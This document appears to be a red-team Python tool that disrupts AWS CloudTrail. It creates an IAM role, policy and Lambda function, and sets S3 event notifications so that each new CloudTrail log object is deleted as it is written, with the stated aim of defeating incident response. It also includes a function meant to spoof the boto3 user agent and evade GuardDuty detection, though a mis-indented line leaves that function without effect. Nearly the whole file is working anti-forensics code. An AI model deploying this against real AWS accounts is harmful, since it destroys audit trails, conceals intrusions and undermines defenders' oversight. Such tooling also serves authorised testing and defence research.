#!/usr/bin/python3
# 
# This script attempts to disrupt CloudTrail by planting a Lambda function that will delete every object created in S3 bucket 
# bound to a trail. As soon as CloudTrail creates a new object in S3 bucket, Lambda will kick in and delete that object. 
# No object, no logs. No logs, no Incident Response :-)
# 
# One will need to pass AWS credentials to this tool. Also, the account affected should have at least following permissions:
# - `iam:CreateRole`
# - `iam:CreatePolicy`
# - `iam:AttachRolePolicy`
# - `lambda:CreateFunction`
# - `lambda:AddPermission`
# - `s3:PutBucketNotification`
# 
# These are the changes to be introduced within a specified AWS account:
# - IAM role will be created, by default with name: `cloudtrail_helper_role`
# - IAM policy will be created, by default with name: `cloudtrail_helper_policy`
# - Lambda function will be created, by default with name: `cloudtrail_helper_function`
# - Put Event notification will be configured on affected CloudTrail S3 buckets.
# 
# This tool will fail upon first execution with the following exception:
# 
# ```
# [-] Could not create a Lambda function: An error occurred (InvalidParameterValueException) when calling the CreateFunction operation: 
#       The role defined for the function cannot be assumed by Lambda.
# ```
# 
# At the moment I did not find an explanation for that, but running the tool again with the same set of parameters - get the job done.
# 
# Afterwards, one should see following logs in CloudWatch traces for planted Lambda function - if no `--disrupt` option was specified:
# 
# ```
# [*] Following S3 object could be removed: (Bucket=90112981864022885796153088027941100000000000000000000000, 
#   Key=cloudtrail/AWSLogs/712800000000/CloudTrail/us-west-2/2019/03/20/712800000000_CloudTrail_us-west-2_20190320T1000Z_oxxxxxxxxxxxxc.json.gz)
# ```
#
# Requirements:
#   - boto3
#   - pytest
#
# Author: Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
#


import io
import sys
import time
import json
import boto3
import urllib
import zipfile
import argparse

config = {
    'debug' : False,

    'region' : '',
    'trail-name' : '',
    'access-key' : '',
    'secret-key' : '',
    'token' : '',

    'disrupt' : False,

    'role-name' : '',
    'policy-name' : '',
    'function-name' : '',

    'statement-id' : 'ID-1',
}

aws_policy_lambda_assume_role = {
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "lambda.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}

aws_policy_for_lambda_role = {
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "arn:aws:logs:*:*:*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:DeleteObject",
        "s3:DeleteObjectVersion"
      ],
      "Resource": [
        "arn:aws:s3:::*"
      ]
    }
  ]
}


aws_s3_bucket_notification_configuration = {
  "LambdaFunctionConfigurations": [
    {
      "LambdaFunctionArn": "<TO-BE-CREATED-LATER>",
      "Id": config['statement-id'], 
      "Events": [
        "s3:ObjectCreated:*"
      ]
    }
  ]
}

disruption_lambda_code_do_harm = '''
        response = s3.delete_object(Bucket=bucket, Key=key)
'''

disruption_lambda_code_no_harm = '''
        print("[*] Following S3 object could be removed: (Bucket={}, Key={})".format(bucket, key))
'''

disruption_lambda_code = '''
import json
import urllib
import boto3

s3 = boto3.client('s3')

def lambda_handler(event, context):
    try:
        bucket = event['Records'][0]['s3']['bucket']['name']
        key = urllib.unquote_plus(event['Records'][0]['s3']['object']['key']).decode('utf8')
        {code}
    except Exception as e:
        print('S3 delete object failed: ' + str(e))
        raise e
'''


class Logger:
    @staticmethod
    def _out(x): 
        sys.stdout.write(x + '\n')

    @staticmethod
    def out(x): 
        Logger._out('[>] ' + x)
    
    @staticmethod
    def info(x):
        Logger._out('[.] ' + x)
    
    @staticmethod
    def fatal(x): 
        sys.stdout.write('[!] ' + x + '\n')
        sys.exit(1)
    
    @staticmethod
    def fail(x):
        Logger._out('[-] ' + x)
    
    @staticmethod
    def ok(x):  
        Logger._out('[+] ' + x)

    @staticmethod
    def dbg(x):  
        if config['debug']:
            sys.stdout.write(f'[dbg] {x}\n')

class CloudTrailDisruptor:
    session = None
    def __init__(self, region, access_key, secret_key, token = ''):
        self.region = region
        self.access_key = access_key
        self.secret_key = secret_key
        self.token = token
        self.session = None
        self.authenticate()

    def authenticate(self):
        try:
            self.session = None
            self.session = boto3.Session(
                aws_access_key_id = self.access_key,
                aws_secret_access_key = self.secret_key,
                aws_session_token = self.token,
                region_name = self.region
            )
        except Exception as e:
            Logger.fail(f'Could obtain AWS session: {e}')
            raise e

    def get_session(self):
        return self.session

    def get_account_id(self):
        try:
            return self.session.client('sts').get_caller_identity()['Account']
        except Exception as e:
            Logger.fatal(f'Could not Get Caller\'s identity: {e}')

    def find_trails_to_disrupt(self):
        cloudtrail = self.session.client('cloudtrail')
        trails = cloudtrail.describe_trails()

        disrupt = []

        for trail in trails['trailList']:
            Logger.dbg(f"Checking whether trail {trail['Name']} is logging.")
            status = cloudtrail.get_trail_status(Name = trail['Name'])
            if status and status['IsLogging']:
                r = 'Yes' if trail['IsMultiRegionTrail'] else 'No'
                Logger.ok(f"Trail {trail['Name']} is actively logging (multi region? {r}).")
                disrupt.append(trail)

        return disrupt
        
    def create_role(self, role_name, role_policy, description = ''):
        iam = self.session.client('iam')
        policy = json.dumps(role_policy)

        roles = iam.list_roles()
        for role in roles['Roles']:
            if role['RoleName'] == role_name:
                Logger.fail(f'Role with name: {role_name} already exists.')
                Logger.dbg("Returning: {}".format(str({'Role':role})))
                return {'Role' : role}

        Logger.info(f'Creating a role named: {role_name}')
        Logger.dbg(f'Policy to be used in role creation:\n{policy}')

        out = {}
        try:
            out = iam.create_role(
                RoleName = role_name,
                AssumeRolePolicyDocument = policy,
                Description = description
            )
        except Exception as e:
            Logger.fatal(f'Could not create a role for Lambda: {e}')
            # Due to fatal, code will not reach this path
            return False

        Logger.ok(f'Role created.')
        Logger.dbg(f'Returned: {out}')

        return out
        
    def create_role_policy(self, policy_name, policy_document, description = ''):
        iam = self.session.client('iam')
        policy = json.dumps(policy_document)

        policies = iam.list_policies(Scope = 'All')
        for p in policies['Policies']:
            if p['PolicyName'] == policy_name:
                Logger.fail(f'Policy with name: {policy_name} already exists.')
                return {'Policy' : p}

        Logger.info(f'Creating a policy named: {policy_name}')
        Logger.dbg(f'Policy to be used in role creation:\n{policy}')

        out = {}
        try:
            out = iam.create_policy(
                PolicyName = policy_name,
                PolicyDocument = policy,
                Description = description
            )
        except Exception as e:
            Logger.fatal(f'Could not create a policy for that lambda role: {e}')
            # Due to fatal, code will not reach this path
            return False

        Logger.ok(f'Policy created.')
        Logger.dbg(f'Returned: {out}')

        return out

    def attach_role_policy(self, role_name, policy_arn):
        Logger.info(f'Attaching policy ({policy_arn}) to the role {role_name}')

        iam = self.session.client('iam')

        attached = iam.list_attached_role_policies(RoleName = role_name)
        for policy in attached['AttachedPolicies']:
            if policy['PolicyArn'] == policy_arn:
                Logger.fail(f'Policy is already attached.')
                return True

        try:
            iam.attach_role_policy(
                RoleName = role_name,
                PolicyArn = policy_arn
            )
        except Exception as e:
            Logger.fatal(f'Could not create a policy for that lambda role: {e}')
            # Due to fatal, code will not reach this path
            return False

        Logger.ok(f'Policy attached.')
        return True

    # Source: https://stackoverflow.com/a/51899017
    @staticmethod
    def create_in_mem_zip_archive(file_map, files):
        buf = io.BytesIO()
        Logger.dbg("Building zip file: " + str(files))
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zfh:
            for file_name in files:
                file_blob = file_map.get(file_name)
                if file_blob is None:
                    Logger.fail("Missing file {} from files".format(file_name))
                    continue
                try:
                    info = zipfile.ZipInfo(file_name)
                    info.date_time = time.localtime()
                    info.compress_type = zipfile.ZIP_DEFLATED
                    info.external_attr = 0o777 << 16  # give full access
                    zfh.writestr(info, file_blob)
                except Exception as ex:
                    raise ex
                    Logger.fail("Error reading file: " + file_name + ", error: " + ex.message)
        buf.seek(0)
        return buf.read()


    def create_lambda_function(self, function_name, role_name, code, description = ''):
        awslambda = self.session.client('lambda')
        lambdacode = CloudTrailDisruptor.create_in_mem_zip_archive(
            {'lambda_function.py': code},
            {'lambda_function.py'}
        )

        funcs = awslambda.list_functions()
        for f in funcs['Functions']:
            if f['FunctionName'] == function_name:
                Logger.fail(f'Function with name: {function_name} already exists. Removing old one.')
                awslambda.delete_function(FunctionName = function_name)
                Logger.ok('Old function was removed.')
                break

        Logger.info(f'Creating a lambda function named: {function_name} on Role: {role_name}')
        Logger.dbg(f'Lambda code to be used:\n{code}')

        out = {}
        try:
            out = awslambda.create_function(
                FunctionName = function_name,
                Runtime = 'python2.7',
                Role = role_name,
                Handler = 'lambda_function.lambda_handler',
                Code = {
                    'ZipFile' : lambdacode,
                },
                Description = description,
                Timeout = 30,
                Publish = True
            )
            Logger.ok(f'Function created.')
        except Exception as e:
            Logger.fail(f'Could not create a Lambda function: {e}')
            if 'The role defined for the function cannot be assumed by Lambda.' in str(e):
                Logger.info('====> This is a known bug (?). Running again this program should get the job done.')

        Logger.dbg(f'Returned: {out}')
        return out

    def permit_function_invoke(self, function_name, statement_id, bucket_arn):
        awslambda = self.session.client('lambda')

        Logger.info(f'Adding invoke permission to func: {function_name} on S3 bucket: {bucket_arn}')
        try:
            out = awslambda.add_permission(
                FunctionName = function_name,
                Action = 'lambda:InvokeFunction',
                Principal = 's3.amazonaws.com',
                SourceArn = bucket_arn,
                StatementId = statement_id
            )
        except Exception as e:
            Logger.fail(f'Could not add permission to the Lambda: {e}. Continuing anyway.')

        return out

    def set_s3_put_notification(self, bucket, notification_configuration):
        s3 = self.session.client('s3')

        arn = notification_configuration['LambdaFunctionConfigurations'][0]['LambdaFunctionArn']
        conf = s3.get_bucket_notification_configuration(Bucket = bucket)
        if 'LambdaFunctionConfigurations' in conf.keys():
            for configuration in conf['LambdaFunctionConfigurations']:
                if configuration['Id'] == config['statement-id'] and arn == configuration['LambdaFunctionArn']:
                    Logger.fail('S3 Put notification already configured for that function on that S3 bucket.')
                    return True

        Logger.info(f'Putting a bucket notification configuration to {bucket}, ARN: {arn}')
        Logger.dbg(f'Notification used :\n{notification_configuration}')

        out = {}
        try:
            out = s3.put_bucket_notification_configuration(
                Bucket = bucket,
                NotificationConfiguration = notification_configuration
            )
        except Exception as e:
            Logger.fail(f'Could not put bucket notification configuration: {e}')
            return False

        return True


def parseOptions(argv):
    global config

    print('''
        :: AWS CloudTrail disruption via S3 Put notification to Lambda
        Disrupts AWS CloudTrail logging by planting Lambda that deletes S3 objects upon their creation
        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
''')

    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <region> [trail_name]')
    parser._action_groups.pop()
    required = parser.add_argument_group('required arguments')
    optional = parser.add_argument_group('optional arguments')

    required.add_argument('region', type=str, help = 'AWS region to use.')

    required.add_argument('--access-key', type=str, help = 'AWS Access Key ID')
    required.add_argument('--secret-key', type=str, help = 'AWS Access Key ID')
    optional.add_argument('--token', type=str, help = 'AWS temporary session token')

    optional.add_argument('trail_name', type=str, default = 'all', nargs='?', help = 'CloudTrail name that you want to disrupt. If not specified, will disrupt every actively logging trail.')

    optional.add_argument('--disrupt', action='store_true', default = False, help = 'By default, this tool will install Lambda that is only logging that it could remove S3 objects. By using this switch, there is going to be Lambda introduced that actually deletes objects.')

    optional.add_argument('--role-name', type=str, default='cloudtrail_helper_role', help = 'name for AWS Lambda role')
    optional.add_argument('--policy-name', type=str, default='cloudtrail_helper_policy', help = 'name for a policy for that Lambda role')
    optional.add_argument('--function-name', type=str, default='cloudtrail_helper_function', help = 'name for AWS Lambda function')

    parser.add_argument('-d', '--debug', action='store_true', help='Display debug output.')

    args = parser.parse_args()

    config['debug'] = args.debug
    config['access-key'] = args.access_key
    config['secret-key'] = args.secret_key
    config['token'] = args.token

    config['region'] = args.region
    config['disrupt'] = args.disrupt
    config['trail-name'] = args.trail_name
    config['role-name'] = args.role_name
    config['policy-name'] = args.policy_name
    config['function-name'] = args.function_name

    if not args.access_key or not args.secret_key:
        Logger.fatal("Please provide AWS Access Key, Secret Key and optionally Session Token")

    return args

def monkeyPatchBotocoreUserAgent():
    '''
    This is to avoid triggering GuardDuty 'PenTest:IAMUser/KaliLinux' alerts
    Source:
      https://www.thesubtlety.com/post/patching-boto3-useragent/
    
    '''
    import sys
    import boto3
    import botocore

    try:
        from _pytest.monkeypatch import MonkeyPatch
    except (ImportError, ModuleNotFoundError) as e:
        print('[!] Please install "pytest" first: pip3 install pytest')
        print('\tthis will be used to patch-up boto3 library to avoid GuardDuty Kali detection')
        sys.exit(0)

    monkeypatch = MonkeyPatch()
    def my_user_agent(self):
        return "Boto3/1.9.89 Python/2.7.12 Linux/4.2.0-42-generic"

        monkeypatch.setattr(botocore.session.Session, 'user_agent', my_user_agent)

def main(argv):
    opts = parseOptions(argv)
    if not opts:
        Logger.err('Options parsing failed.')
        return False

    monkeyPatchBotocoreUserAgent()

    dis = CloudTrailDisruptor(
        config['region'], 
        config['access-key'], 
        config['secret-key'], 
        config['token']
    )

    account_id = dis.get_account_id()
    Logger.info(f'Will be working on Account ID: {account_id}')

    Logger.info('Step 1: Determine trail to disrupt')
    trails = []
    if config['trail-name'] and config['trail-name'] != 'all':
        Logger.ok(f"Will use trail specified by user: {config['trail-name']}")
        trail_name = config['trail-name']
        ct = dis.get_session().client('cloudtrail')
        t = ct.describe_trails(trailNameList=[trail_name,])
        trails.append(t[0])
    else:
        trails.extend(dis.find_trails_to_disrupt())

    Logger.info('Trails intended to be disrupted:')
    for trail in trails:
        Logger._out(f'\t- {trail["Name"]}')

    Logger._out('')
    Logger.info('Step 2: Create a role to be assumed by planted Lambda')
    created_role = dis.create_role(config['role-name'], aws_policy_lambda_assume_role)
    if not created_role:
        Logger.fatal('Could not create a lambda role.')

    Logger.info('Step 3: Create a policy for that role')
    policy = dis.create_role_policy(config['policy-name'], aws_policy_for_lambda_role)
    if not policy:
        Logger.fatal('Could not create a policy for lambda role.')

    Logger.info('Step 4: Attach policy to the role')
    if not dis.attach_role_policy(config['role-name'], policy['Policy']['Arn']):
        Logger.fatal('Could not attach a policy to the lambda role.')
    
    Logger.info('Step 5: Create Lambda function')
    code = ''

    if config['disrupt']:
        code = disruption_lambda_code.format(code = disruption_lambda_code_do_harm)
        Logger.info('\tUSING DISRUPTIVE LAMBDA!')
    else:
        code = disruption_lambda_code.format(code = disruption_lambda_code_no_harm)
        Logger.info('\tUsing non-disruptive lambda.')

    if not dis.create_lambda_function(config['function-name'], created_role['Role']['Arn'], code):
        Logger.fatal('Could not create a Lambda function.')
    
    Logger.info('Step 6: Permit function to be invoked on all trails')
    for trail in trails:
        bucket_arn = f"arn:aws:s3:::{trail['S3BucketName']}"
        dis.permit_function_invoke(config['function-name'], config['statement-id'], bucket_arn)
    
    Logger.info('Step 7: Configure trail bucket\'s put notification')
    global aws_s3_bucket_notification_configuration

    regions = [config['region'], ]
    for region in regions:
        arn = f"arn:aws:lambda:{region}:{account_id}:function:{config['function-name']}"
        aws_s3_bucket_notification_configuration['LambdaFunctionConfigurations'][0]['LambdaFunctionArn'] = arn
        for trail in trails:
            dis.set_s3_put_notification(
                    trail['S3BucketName'], 
                    aws_s3_bucket_notification_configuration
            )

    print("[+] Installed CloudTrail's S3 bucket disruption Lambda.")

if __name__ == '__main__':
    main(sys.argv)
